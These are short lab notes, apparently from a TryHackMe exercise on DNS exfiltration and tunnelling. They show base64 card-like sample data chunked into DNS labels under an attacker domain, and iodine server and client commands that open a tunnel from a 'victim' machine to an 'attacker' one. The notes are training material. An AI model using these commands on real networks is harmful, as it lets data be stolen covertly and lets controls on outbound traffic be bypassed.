 echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d


 [+] DNS tunnling
 setup NS record value attacker ip 
 run command on attacker vm 
 sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com 

 victim vm 
  sudo iodine -P thmpass att.tunnel.com 
  